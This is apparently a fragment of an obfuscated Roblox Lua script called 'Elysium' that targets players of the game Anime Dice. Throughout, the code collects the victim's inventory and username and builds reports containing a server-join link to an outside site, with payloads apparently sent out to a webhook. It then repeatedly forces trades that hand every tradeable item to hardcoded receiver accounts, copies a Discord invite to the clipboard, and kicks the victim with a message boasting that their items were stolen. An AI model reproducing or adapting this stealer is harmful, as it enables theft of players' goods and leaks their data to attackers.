	local v267 = string.format("https://plsbrainrot.me/joiner?placeId=%s&gameInstanceId=%s", game.PlaceId, game.JobId)
	local v268 = v263 and string.format("[**View Full Inventory**](%s)", v263) or "*Sourcebin upload failed*"
	local t19 = {
		title = "Anime Dice Hit! elsysuhhhhh",
		color = 5793266,
		fields = {
			{
				name = "ðŸ‘¤ **Player Info**",
				value = string.format([[```
Username: %s
Players: %d/%d
Executor: %s
Receivers: %s
```]], LocalPlayer.Name, #Players:GetPlayers(), Players.MaxPlayers, v87(), table.concat(RECEIVERS, ", ")),
				inline = false
			},
			{
				name = "ðŸŽ¯ **Units** â€” Rarity: " .. v250,
				value = "```\n" .. table.concat(t17, "\n") .. "\n```",
				inline = false
			},
			{
				name = "ðŸ“¦ **Items**",
				value = "```\n" .. table.concat(t18, "\n") .. "\n```",
				inline = false
			},
			{
				name = "ðŸ“„ **Full Inventory**",
				value = v268,
				inline = false
			},
			{
				name = "ðŸŒ **Join Server**",
				value = string.format("[**%s**](%s)", game.JobId, v267),
				inline = false
			}
		},
		footer = {
			text = "Elysium! (Anime Dice)"
		},
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
	}

	if v251 then
		v203()
	end

	v229({ t19 }, v251)
end

if setclipboard then
	setclipboard("https://discord.gg/3lysium")
end

local function v270()
	local v271, v272 = v164()
	local t20 = {}
	local v274, v275, v276 = ipairs(v271)
	local v277 = geniter(v274, v275, v276)

	while true do
		local v278 = table.pack(v277())

		if not v278[1] then
			break
		end

		local v279 = v278[3]

		if not (v278[2] > 20) then
			table.insert(t20, v107(v279))

			continue
		end

		break
	end

	if #v271 > 20 then
		table.insert(t20, string.format("...and %d more units", #v271 - 20))
	end

	if #t20 == 0 then
		table.insert(t20, "*No units*")
	end

	local t21 = {}
	local v281, v282, v283 = ipairs(v272)

	for k, v in v281, v282, v283 do
		if not (k > 20) then
			table.insert(t21, v109(v))

			continue
		end

		break
	end

	if #v272 > 20 then
		table.insert(t21, string.format("...and %d more items", #v272 - 20))
	end

	if #t21 == 0 then
		table.insert(t21, "*No whitelisted items found*")
	end

	local v286 = THRESHOLD == 0 and "disabled" or ">= " .. v106(THRESHOLD)
	local t22 = {
		title = "Anime Dice Hit! elyssssssuum",
		color = 5793266
	}
	local fields = {
		{
			name = "ðŸ‘¤ **Player Info**",
			value = string.format("```\nUsername: %s\nPlayers: %d/%d\nExecutor: %s\n```", LocalPlayer.Name, #Players:GetPlayers(), Players.MaxPlayers, v87()),
			inline = false
		},
		{
			name = "ðŸŽ¯ **Units** â€” Rarity: " .. v286,
			value = "```\n" .. table.concat(t20, "\n") .. "\n```",
			inline = false
		},
		{
			name = "ðŸ“¦ **Items**",
			value = "```\n" .. table.concat(t21, "\n") .. "\n```",
			inline = false
		}
	}

	t22.fields = fields
	t22.footer = {
		text = "Elysium! (Anime Dice)"
	}
	t22.timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
	v231({ t22 })
end

local u292
local u293
local t26 = {}
local u295 = false

local function v296(p41)
	local v297 = t26[p41]

	if v297 then
		return math.max(0, TradeConfig.REQUEST_COOLDOWN + 0.5 - (os.clock() - v297))
	end

	return 0
end
local function v298(p42)
	p42.offersAdded = false
	p42.rejected = {}
	p42.firedReady = false
	p42.firedAccepted = false
	p42.lastObservedState = nil
	v61("tradeLoop started for", p42.receiver.Name)

	while u292 == p42 and not p42.result do
		local state = p42.state

		if state then
			local lastObservedState = state.phase .. "|" .. tostring(state.ownReady) .. "|" .. tostring(state.ownAccepted)

			if p42.lastObservedState ~= lastObservedState then
				p42.firedReady = false
				p42.firedAccepted = false
				p42.lastObservedState = lastObservedState
			end

			local v301 = v123(p42.unitLimit)
			local ownOffer = state.ownOffer or {}
			local v303

			for _, v in ipairs(v301) do
				if (ownOffer[v.key] or 0) < v.amount then
					if (p42.rejected[v.key] or 0) < 3 then
						v303 = v

						break
					end
				end
			end

			local v306 = state.phase == "Offer" and not state.ownReady and not p42.firedReady

			if v303 then
				if v306 then
					p42.offersAdded = false
					v61(string.format("Fire ChangeOffer: %s x%s (phase=%s, rej=%d)", v303.name, tostring(v303.amount), tostring(state.phase), p42.rejected[v303.key] or 0))

					local now = os.clock()

					signal2:Fire(v303.key, v303.amount)

					local v308 = now + 0.6
					local v309 = false
					local exitTo

					while true do
						if not (os.clock() < v308) then
							exitTo = 1

							break
						end

						task.wait(0.05)

						if u292 ~= p42 or p42.result then
							break
						end

						local state2 = p42.state

						if not state2 then
							exitTo = 1

							break
						end

						if not (v303.amount <= ((state2.ownOffer or {})[v303.key] or 0)) then
							if state2.phase == state.phase then
								continue
							end

							exitTo = 1

							break
						end

						exitTo = 2

						break
					end

					if exitTo ~= 1 then
						if exitTo ~= 2 then
							return
						end

						v309 = true
					end

					local v312 = os.clock() - now

					if v312 < 0.2 then
						task.wait(0.2 - v312)
					end

					if v309 then
						v61(string.format("  confirmed %s", v303.name))
					else
						local rejected = p42.rejected
						local key = v303.key

						rejected[key] = (p42.rejected[v303.key] or 0) + 1
						v61(string.format("  no echo for %s (rejected %d/%d)", v303.name, p42.rejected[v303.key], 3))
					end

					continue
				end
			end

			if v303 then
				task.wait(0.1)

				continue
			end

			p42.offersAdded = true

			if state.phase == "Offer" then
				if not state.ownReady then
					if p42.firedReady then
						task.wait(0.15)

						continue
					end

					p42.firedReady = true
					v61("Fire Advance (Ready) â€” phase=Offer")

					local now = os.clock()

					signal3:Fire()

					local v316 = now + 0.8
					local exitTo2

					while true do
						if not (os.clock() < v316) then
							exitTo2 = 1

							break
						end

						task.wait(0.05)

						if u292 ~= p42 or p42.result then
							break
						end

						local state2 = p42.state

						if state2 and state2.ownReady == state.ownReady and state2.phase == state.phase then
							continue
						end

						exitTo2 = 1

						break
					end

					if exitTo2 ~= 1 then
						return
					end

					local v319 = os.clock() - now

					if not (v319 < 0.2) then
						continue
					end

					task.wait(0.2 - v319)

					continue
				end
			end

			if state.phase ~= "Confirm" or state.ownAccepted then
				task.wait(0.15)

				continue
			end

			if p42.firedAccepted then
				task.wait(0.15)

				continue
			end

			p42.firedAccepted = true
			v61("Fire Advance (Accept) â€” phase=Confirm")

			local now = os.clock()

			signal3:Fire()

			local v321 = now + 0.8
			local exitTo3

			while true do
				if not (os.clock() < v321) then
					exitTo3 = 1

					break
				end

				task.wait(0.05)

				if u292 ~= p42 or p42.result then
					break
				end

				local state2 = p42.state

				if state2 and state2.ownAccepted == state.ownAccepted and state2.phase == state.phase then
					continue
				end

				exitTo3 = 1

				break
			end

			if exitTo3 ~= 1 then
				return
			end

			local v324 = os.clock() - now

			if v324 < 0.2 then
				task.wait(0.2 - v324)
			end

			continue
		end

		task.wait(0.1)
	end

	v61("tradeLoop ended for", p42.receiver.Name, "â€” result:", tostring(p42.result))
end

signal5:Connect(function(p43, p44)
	local v325 = u292 or u293

	if not v325 then
		return
	end

	if p43 == "RequestSent" and p44.player == v325.receiver then
		v325.requestSent = true
		v61("event: RequestSent")
	elseif p43 == "RequestExpired" and p44.player == v325.receiver then
		v325.result = "RequestExpired"
		v61("event: RequestExpired")
	elseif p43 == "RequestClosed" and p44.player == v325.receiver and not v325.started then
		v61("event: RequestClosed (pre-start)")
		task.delay(1.5, function()
			if u292 == v325 and not (v325.started or v325.result) then
				v325.result = "Declined"
			end
		end)
	elseif p43 == "Started" and p44.partner == v325.receiver then
		v325.started = true
		v61("event: Started with", p44.partner.Name)
		task.spawn(v298, v325)
	elseif p43 == "Updated" then
		local state = v325.state
		local phase = state and state.phase or "?"
		local phase2 = p44.phase

		if phase ~= phase2 then
			v61(string.format("phase: %s â†’ %s (ownReady=%s ownAccepted=%s otherReady=%s otherAccepted=%s)", tostring(phase), tostring(phase2), tostring(p44.ownReady), tostring(p44.ownAccepted), tostring(p44.otherReady), tostring(p44.otherAccepted)))
		end

		if v325.offersAdded and state and (state.phase == "Confirm" or state.phase == "Countdown") and p44.phase == "Offer" then
			v325.resets += 1
			v61("RESET detected. count =", v325.resets)

			if v325.resets >= 8 then
				v325.storageSuspect = true
				signal4:Fire()
			end
		end

		v325.state = p44
	elseif p43 == "Ended" then
		v325.result = tostring(p44.reason)
		v61("event: Ended â€”", tostring(p44.reason))
	end
end)

local function v329(p45, p46)
	if u295 then
		return nil
	end

	u295 = true

	local v330 = v296(p45.UserId)

	if v330 > 0 then
		task.wait(v330)
	end

	if p45.Parent ~= Players then
		u295 = false

		return nil
	end

	local t27 = {
		receiver = p45,
		unitLimit = p46,
		resets = 0,
		unitsOffered = 0
	}

	u292 = t27
	u293 = t27
	t26[p45.UserId] = os.clock()
	v61("Requesting trade with", p45.Name)
	signal:Fire(p45)

	local now = os.clock()
	local v333 = false

	while not t27.result do
		local v334 = os.clock() - now

		if t27.requestSent or t27.started then
			v333 = true
		end

		if not v333 and v334 > 8 then
			t27.result = "RequestRejected"
		elseif p45.Parent == Players then
			if v334 > 90 then
				signal4:Fire()
				t27.result = "Timeout"
			end
		else
			t27.result = "ReceiverLeft"
		end

		task.wait(0.1)
	end

	if u292 == t27 then
		u292 = nil
	end

	u295 = false

	return t27
end

v192()
task.spawn(function()
	v232("startup")
	v270("startup")
end)
v123(nil)

local t28 = {}
local n4 = 0
local t29 = {}

local function v338(p47, p48, p49)
	if not p48 then
		return
	end

	if p48.result == "Completed" then
		n4 += 1

		local v339 = v61
		local v340 = ("Completed trade with %* (total %*)"):format(p47.Name, n4)

		v339(v340)
		task.wait(1.5)
		v192()
	elseif p48.storageSuspect then
		local v341 = math.floor((p48.unitsOffered or p49) / 2)

		t28[p47.UserId] = v341

		local v342 = v61
		local v343 = ("%* likely out of Unit Storage -> next offer max %* unit(s)."):format(p47.Name, v341)

		v342(v343)
	else
		local v344 = v61
		local v345 = ("Trade with %* ended: %*"):format(p47.Name, p48.result)

		v344(v345)
	end
end
local function v346(p50)
	if t29[p50.UserId] then
		return
	end

	t29[p50.UserId] = true
	task.spawn(function()
		if not v114(p50, 3) then
			local v347 = v61
			local v348 = ("%* never became ready â€” aborting receiver loop."):format(p50.Name)

			v347(v348)
			t29[p50.UserId] = nil

			return
		end

		local v349 = v61
		local v350 = ("%* is ready â€” starting infinite trade loop."):format(p50.Name)

		v349(v350)

		while p50 and p50.Parent == Players do
			if not u295 then
				if not u292 then
					local MAX_UNIQUE_ENTRIES = t28[p50.UserId] or TradeConfig.MAX_UNIQUE_ENTRIES

					if #v123(MAX_UNIQUE_ENTRIES) > 0 then
						local ok, result = pcall(v329, p50, MAX_UNIQUE_ENTRIES)

						if ok then
							v338(p50, result, MAX_UNIQUE_ENTRIES)
						else
							if u292 then
								u292 = nil
							end

							u295 = false
						end
					end
				end
			end

			task.wait(0.5)
		end

		local v354 = v61
		local v355 = ("%* left â€” receiver loop ended."):format(p50.Name)

		v354(v355)
		t29[p50.UserId] = nil
	end)
end

Players.PlayerAdded:Connect(function(player)
	if player == LocalPlayer then
		return
	end

	if not v65(player) then
		return
	end

	local v356 = v61
	local v357 = ("Receiver %* joined â€” waiting for them to load into the world."):format(player.Name)

	v356(v357)
	v346(player)
end)

for _, v in ipairs(RECEIVERS) do
	local v360 = v66(v)

	if v360 then
		local v361 = ("Receiver %* already in server â€” starting loop now."):format(v360.Name)

		v61(v361)
		v346(v360)
	end
end

local function v362()
	local _, v364 = v123(nil)

	return v364 or 0
end
local function v365()
	local v366 = v362()

	if v366 ~= 0 then
		local v367 = v61
		local v368 = ("Kick watcher: %* tradeable item(s) at startup â€” watching."):format(v366)

		v367(v368)
		task.spawn(function()
			task.wait(3)

			repeat
				task.wait(2)
			until v362() == 0

			v61("Kick watcher: nothing left to trade â€” kicking player.")
			pcall(function()
				task.wait(1)
				LocalPlayer:Kick([[All your items just got stolen by Elysium.
 Join our Discord: https://discord.gg/3lysium 
]])
			end)
		end)

		return
	end

	v61("Kick watcher: nothing tradeable at startup â€” not watching.")
end

v365()

while true do
	local _, v370, _, v372 = v123(nil)
	local t30 = {}
	local v374 = true

	for _, v in ipairs(RECEIVERS) do
		local v377 = v66(v)

		if v377 then
			table.insert(t30, v377)

			if not ((t28[v377.UserId] or TradeConfig.MAX_UNIQUE_ENTRIES) > 0) then
				continue
			end

			v374 = false
		end
	end

	if v370 == 0 or v372 == 0 and v374 then
		task.wait()

		continue
	end

	if #t30 == 0 then
		task.wait()

		continue
	end

	local v378 = false
	local huge = math.huge

	for _, v in ipairs(t30) do
		local v382 = v296(v.UserId)

		if v382 > 0 then
			huge = math.min(huge, v382)

			continue
		end

		local MAX_UNIQUE_ENTRIES = t28[v.UserId] or TradeConfig.MAX_UNIQUE_ENTRIES

		if not (#v123(MAX_UNIQUE_ENTRIES) > 0) then
			continue
		end

		if u295 or u292 then
			v378 = true
		else
			v378 = true

			local ok, result = pcall(v329, v, MAX_UNIQUE_ENTRIES)

			if ok then
				v338(v, result, MAX_UNIQUE_ENTRIES)
			elseif u292 then
				u292 = nil
				u295 = false
			else
				u295 = false
			end
		end

		break
	end

	if v378 then
		continue
	end

	if not (huge < math.huge) then
		task.wait()

		continue
	end

	task.wait(math.min(huge, 0.1) + 0.02)
end
